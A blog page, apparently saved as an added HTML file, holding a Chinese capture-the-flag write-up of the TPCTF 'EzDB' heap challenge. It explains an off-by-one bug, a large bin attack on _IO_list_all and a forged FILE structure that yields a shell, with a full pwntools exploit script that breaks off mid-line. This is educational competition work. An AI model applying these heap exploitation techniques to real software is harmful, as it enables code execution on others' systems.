@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="TPCTF-EzDB一. 背景介绍​	本题主要是一个C++的菜单堆题，主要考察对于代码简单进行逆向以及利用large bin attack的攻击，在比赛过程中发现本地用的ubuntu虚拟机和远程的heap中偏移不是一样的，导致在打远程的时候存在问题，经过后面队里面其他同学的修改最终完成本题题目的求解。 二. 漏洞形成原因分析 ​	本题在逆向难度上基本没有过多的考察，通过menu也可以知道，实际上这">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TPCTF-EzDB">
+<meta property="og:url" content="http://example.com/2025/03/10/TPCTF-EzDB/index.html">
+<meta property="og:site_name" content="a2ure&#39;s blog">
+<meta property="og:description" content="TPCTF-EzDB一. 背景介绍​	本题主要是一个C++的菜单堆题，主要考察对于代码简单进行逆向以及利用large bin attack的攻击，在比赛过程中发现本地用的ubuntu虚拟机和远程的heap中偏移不是一样的，导致在打远程的时候存在问题，经过后面队里面其他同学的修改最终完成本题题目的求解。 二. 漏洞形成原因分析 ​	本题在逆向难度上基本没有过多的考察，通过menu也可以知道，实际上这">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/ezdb/1741571381381.jpg">
+<meta property="og:image" content="http://example.com/images/ezdb/1741571534357.jpg">
+<meta property="og:image" content="http://example.com/images/ezdb/1741571815263.jpg">
+<meta property="og:image" content="http://example.com/images/ezdb/1741571783536.jpg">
+<meta property="og:image" content="http://example.com/images/ezdb/1741572079501.jpg">
+<meta property="og:image" content="http://example.com/images/ezdb/1741572300766.jpg">
+<meta property="og:image" content="http://example.com/images/ezdb/1741572502632.jpg">
+<meta property="og:image" content="http://example.com/images/ezdb/1741573120769.jpg">
+<meta property="og:image" content="http://example.com/images/ezdb/1741573545142.jpg">
+<meta property="article:published_time" content="2025-03-10T02:45:13.000Z">
+<meta property="article:modified_time" content="2025-03-10T02:49:32.973Z">
+<meta property="article:author" content="a2ure">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/ezdb/1741571381381.jpg">
+
+<link rel="canonical" href="http://example.com/2025/03/10/TPCTF-EzDB/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>TPCTF-EzDB | a2ure's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">a2ure's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/10/TPCTF-EzDB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="a2ure">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="a2ure's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          TPCTF-EzDB
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2025-03-10 10:45:13 / Modified: 10:49:32" itemprop="dateCreated datePublished" datetime="2025-03-10T10:45:13+08:00">2025-03-10</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>2.7k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>10 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="TPCTF-EzDB"><a href="#TPCTF-EzDB" class="headerlink" title="TPCTF-EzDB"></a>TPCTF-EzDB</h1><h2 id="一-背景介绍"><a href="#一-背景介绍" class="headerlink" title="一. 背景介绍"></a>一. 背景介绍</h2><p>​	本题主要是一个C++的菜单堆题，主要考察对于代码简单进行逆向以及利用large bin attack的攻击，在比赛过程中发现本地用的ubuntu虚拟机和远程的heap中偏移不是一样的，导致在打远程的时候存在问题，经过后面队里面其他同学的修改最终完成本题题目的求解。</p>
+<h2 id="二-漏洞形成原因分析"><a href="#二-漏洞形成原因分析" class="headerlink" title="二. 漏洞形成原因分析"></a>二. 漏洞形成原因分析</h2><p><img src="/./images/ezdb/1741571381381.jpg" alt="1741571381381"></p>
+<p>​	本题在逆向难度上基本没有过多的考察，通过menu也可以知道，实际上这个题就是五个功能，创建删除一个Table，插入读取修改一个记录，很经典的菜单堆的题目背景，之后我们跟进到具体的函数中来查看到底是如何实现的。</p>
+<h3 id="2-1-add-Page"><a href="#2-1-add-Page" class="headerlink" title="2.1 add Page"></a>2.1 add Page</h3><p><img src="/./images/ezdb/1741571534357.jpg" alt="1741571534357"></p>
+<p>​	对于create函数需要关注的并不多，只是可以根据这个Init函数来恢复一下这个结构体的信息，也非常方便的逆向出来，其实就是一个初始指针（之后可以看到这个指针每条记录增加4字节），结束指针，以及base指针（后面也不会修改只是记录一下这个地址，感觉没什么作用）</p>
+<h3 id="2-2-del-Page"><a href="#2-2-del-Page" class="headerlink" title="2.2 del Page"></a>2.2 del Page</h3><p>​	对于删除操作就不做过多分析了，只是获取到对应的Page之后删除这个malloc的空间以及对应的Page就可以了。</p>
+<h3 id="2-3-add-Record"><a href="#2-3-add-Record" class="headerlink" title="2.3 add Record"></a>2.3 add Record</h3><p><img src="/./images/ezdb/1741571815263.jpg" alt="1741571815263"></p>
+<p>​	这里着重说一下增加记录这个功能，首先他是申请了一个0x10大小的record，之后根据用户指定的size来分配内存，后面不管插入成功与否都会把这个记录删掉，这个设计很神奇</p>
+<p><img src="/./images/ezdb/1741571783536.jpg" alt="1741571783536"></p>
+<p>​	之后进入到插入记录这个功能，首先就是获取size大小然后和空闲的大小比较，如果可以写则在chunk的最开始低word区域写还能写的size数目，高word写size的大小，之后修改start指针，把内容从分配的chunk拷贝过去，之后返回id，这里看起来没什么问题，但是实际上问题出现在获取空闲大小这里。</p>
+<p><img src="/./images/ezdb/1741572079501.jpg" alt="1741572079501"></p>
+<p>​	这里多加了一个1，这个1就很重要，通过这个我们可以比正常的内容多写一个字节，通过刚才的分析我们可以知道高word写道是能写的size大小，如果我们可以Off by one就可以把这个size改成很大，导致下面的chunk我们都可以任意地址写了，因此本题漏洞出现的地方就在这里。</p>
+<h3 id="2-4-get-Record"><a href="#2-4-get-Record" class="headerlink" title="2.4 get Record"></a>2.4 get Record</h3><p><img src="/./images/ezdb/1741572300766.jpg" alt="1741572300766"></p>
+<p>​	这里其实就是通过之前的内容，恢复回之前的Record结构体，但是这里指针指向的就是复制到Page里面的内容，size也是从这里获取，因此只要我们根据刚才的内容修改了size就可以读取很多的内容。</p>
+<h3 id="2-5-edit-Record"><a href="#2-5-edit-Record" class="headerlink" title="2.5 edit Record"></a>2.5 edit Record</h3><p><img src="/./images/ezdb/1741572502632.jpg" alt="1741572502632"></p>
+<p>​	这里就是对于修改的操作，其实原理和上述差不多，就是比较size，这里需要注意的是edit的内容必须要比之前Page里面记录的size要小，因此我们修改Page的size之后这里就可以分配一个很大的Chunk，并且把里面的内容复制下去。</p>
+<h2 id="三-漏洞利用"><a href="#三-漏洞利用" class="headerlink" title="三. 漏洞利用"></a>三. 漏洞利用</h2><h3 id="3-1-漏洞利用原理"><a href="#3-1-漏洞利用原理" class="headerlink" title="3.1 漏洞利用原理"></a>3.1 漏洞利用原理</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">addPage(<span class="number">1</span>)</span><br><span class="line">addPage(<span class="number">2</span>)</span><br><span class="line">addPage(<span class="number">3</span>)</span><br><span class="line">addRecord(<span class="number">3</span>, <span class="number">0x400</span> - <span class="number">3</span>, <span class="string">b&#x27;/x10&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    addPage(i + <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delPage(<span class="number">11</span> - i)</span><br><span class="line"></span><br><span class="line">getRecord(<span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">io.recv(<span class="number">1131</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">8</span>)) - <span class="number">0x21ace0</span></span><br><span class="line">io.recv(<span class="number">1000</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">8</span>)) &lt;&lt; <span class="number">12</span></span><br></pre></td></tr></table></figure>
+
+<p>​	首先就是根据题目中包含的漏洞来实现对于Libc基地址和heap基地址的获取，这里首先分配了3个Page（这里其实没必要这么多，我之前在构造时写的，后面懒得改偏移了就保留了），之后就是增加记录，通过off by one的漏洞修改size域的高一个byte，之后的操作就是利用分配和删除页面构造出来一个unsorted bin，这里两个目的，一个是为了泄露基地址，一方面也是为了后面对于large bin attack做准备，之后就是泄露程序的基地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">editRecord(<span class="number">3</span>, <span class="number">0</span>, <span class="number">0x500</span>, <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x400</span> - <span class="number">3</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x21</span>) + p64((heap_base &gt;&gt; <span class="number">12</span>) - <span class="number">1</span>) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x8</span> + p64(<span class="number">0x0</span>) + p64(<span class="number">0x21</span>) + p64(heap_base &gt;&gt; <span class="number">12</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x8</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>) + p64(libc_base + <span class="number">0x21b0d0</span>) + p64(libc_base + <span class="number">0x21b0d0</span>) + p64(heap_base - <span class="number">0x60</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>] - <span class="number">0x20</span>))</span><br></pre></td></tr></table></figure>
+
+<p>​	因为这里修改了size域，所以就可以edit一个很大的块并且构造好数据，这里其实就是要维护好堆的结构，根据gdb获取出来堆结构就可以了，并且要覆盖large bin的bk next域为_IO_list_all - 0x20的位置，方便后面进行large bin attck。这里有一个很巧妙的设计，这里再获取分配edit的时候会把unsorted bin放到large bin里面，在这之前会进行融合，这里根据之前的分配page正好会在unsorted bin下面放一个fast bin，这样就会将他们融合获取到一个0x420大小的chunk，这样就完成了一个比Page大的large bin（这里需要注意的是，因为本题没有对于edit 的Record进行删除的操作，所以获取一个任意大小的chunk还是比较困难的，只能通过这种方式来获取）</p>
+<p><img src="/./images/ezdb/1741573120769.jpg" alt="1741573120769"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">delPage(<span class="number">12</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    addPage(i + <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">addRecord(<span class="number">1</span>, <span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">editRecord(<span class="number">3</span>, <span class="number">0</span>, <span class="number">0x70</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>​	之后就是构造另一个large bin，这里删除page 12就是获取了0x410的unsorted bin，但是这里如果直接利用large bin attack会发现这里又和一个0x30的chunk融合了，变成0x440就不能实现攻击了，因此我们add Page把之前这些0x30和0x400的Page都分配回去，防止影响我们后面的攻击，到这里就可以large bin attack了吗？nonono 还是有问题，前面的操作只是把tcache的chunk都分配了，但是之前free的是8个页面，观看下面的heap结构就会知道，现在依旧再要largebin之前存在一个0x30的chunk，并且还是fastbin，因此我们只需要重新addRecord一个0x20的chunk(实际大小是0x30)，由于之前还有一个实际大小是0x20的chunk，通过add操作完美的把他们分配又释放了一次，这样这里的fastbin就会回到tcache中去，不会影响到下面的chunk了</p>
+<p><img src="/./images/ezdb/1741573545142.jpg" alt="1741573545142"></p>
+<p>​	之后就是很关键的一步，按照以前的操作，我都是再次分配一个更大的chunk然后这里的unsorted bin就会变成large bin然后完成large bin attack，之后再分配回来这个页面，使得_IO_list_all可以指向之前伪造的largebin，但是这里经过队里其他队友的exp可以发现，直接edit 一个small bin大小的chunk就足够完成上述这么复杂的操作了，首先由于之前没有分割过Chunk，所以last remainder为空，这样找不到对应的chunk就会把这个unsorted bin放到large bin当中，完成large bin attack，之后从小到大的遍历large bin就获得到这个刚变成large bin的chunk，然后把他分割之后放回到unsorted bin中变成last remainder，完美的实现我们上述的需求，而且只需要分配一次，减少了很多出现问题的可能。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27; sh&#x27;</span>.ljust(<span class="number">0x8</span>,<span class="string">b&#x27;/x00&#x27;</span>) + p64(<span class="number">0x421</span>) </span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;/x00&#x27;</span>) + p64(heap_base)</span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;/x00&#x27;</span>) + p64(libc_base + <span class="number">0x51d70</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;/x00&#x27;</span>) + p64(heap_base + <span class="number">0xba0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;/x00&#x27;</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0xe0</span>, <span class="string">b&#x27;/x00&#x27;</span>) + p64(heap_base + <span class="number">0xba0</span>)</span><br><span class="line">editRecord(<span class="number">3</span>, <span class="number">0</span>, <span class="number">0x600</span>, <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x400</span> - <span class="number">3</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x21</span>) + p64((heap_base &gt;&gt; <span class="number">12</span>) - <span class="number">1</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x8</span> + p64(<span class="number">0x0</span>) + p64(<span class="number">0x21</span>) + p64(heap_base &gt;&gt; <span class="number">12</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x8</span> + payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>​	最后就是修改第一个我们伪造的第一个largebin的结构，因为刚才以及重新把第二个large bin给取出来了，因此_IO_list_all现在指向的是第一次分配的large bin，我们伪造一下file的结构（再debug的时候发现，在_IO_write_ptr这里也就是0x28如果为空会走不到后面的地方，以后做题时需要注意），之后按照house of apple2的结构伪造，由于题目中没有沙盒，直接伪造就可以了，之后最终通过输出6走到程序main函数退出，退出之后会执行exit并且刷新文件流，实现攻击最终获得shell</p>
+<h3 id="3-2-完整exp"><a href="#3-2-完整exp" class="headerlink" title="3.2 完整exp"></a>3.2 完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./db&quot;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>, <span class="string">&#x27;-n&#x27;</span>, <span class="string">&#x27;debug&#x27;</span> ]</span><br><span class="line"><span class="comment">#io = remote(&quot;61.147.171.106&quot;, 54896)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addPage</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delPage</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addRecord</span>(<span class="params">idx, length, text</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Varchar Length: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Varchar: &#x27;</span>)</span><br><span class="line">    io.send(text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getRecord</span>(<span class="params">idx, Recordid</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Slot ID: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(Recordid).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editRecord</span>(<span class="params">idx, Recordid, length, text</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Slot ID: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(Recordid).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Varchar Length: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Varchar: &#x27;</span>)</span><br><span class="line">    io.send(text)</span><br><span class="line"></span><br><span class="line">addPage(<span class="number">1</span>)</span><br><span class="line">addPage(<span class="number">2</span>)</span><br><span class="line">addPage(<span class="number">3</span>)</span><br><span class="line">addRecord(<span class="number">3</span>, <span class="number">0x400</span> - <span class="number">3</span>, <span class="string">b&#x27;/x10&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    addPage(i + <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delPage(<span class="number">11</span> - i)</span><br><span class="line"></span><br><span class="line">getRecord(<span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">io.recv(<span class="number">1131</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">8</span>)) - <span class="number">0x21ace0</span></span><br><span class="line">io.recv(<span class="number">1000</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">8</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">editRecord(<span class="number">3</span>, <span class="number">0</span>, <span class="number">0x500</span>, <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x400</span> - <span class="number">3</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x21</span>) + p64((heap_base &gt;&gt; <span class="number">12</span>) - <span class="number">1</span>) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x8</span> + p64(<span class="number">0x0</span>) + p64(<span class="number">0x21</span>) + p64(heap_base &gt;&gt; <span class="number">12</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x8</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>) + p64(libc_base + <span class="number">0x21b0d0</span>) + p64(libc_base + <span class="number">0x21b0d0</span>) + p64(heap_base - <span class="number">0x60</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>] - <span class="number">0x20</span>))</span><br><span class="line">delPage(<span class="number">12</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    addPage(i + <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">addRecord(<span class="number">1</span>, <span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">editRecord(<span class="number">3</span>, <span class="number">0</span>, <span class="number">0x70</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27; sh&#x27;</span>.ljust(<span class="number">0x8</span>,<span class="string">b&#x27;/x00&#x27;</span>) + p64(<span class="number">0x421</span>) </span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;/x00&#x27;</span>) + p64(heap_base)</span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;/x00&#x27;</span>) + p64(libc_base + <span class="number">0x51d70</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;/x00&#x27;</span>) + p64(heap_base + <span class="number">0xba0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;/x00&#x27;</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0xe0</span>, <span class="string">b&#x27;/x00&#x27;</span>) + p64(heap_base + <span class="number">0xba0</span>)</span><br><span class="line">editRecord(<span class="number">3</span>, <span class="number">0</span>, <span class="number">0x600</span>, <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x400</span> - <span class="number">3</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x21</span>) + p64((heap_base &gt;&gt; <span class="number">12</span>) - <span class="number">1</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x8</span> + p64(<span class="number">0x0</span>) + p64(<span class="number">0x21</span>) + p64(heap_base &gt;&gt; <span class="number">12</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x8</span> + 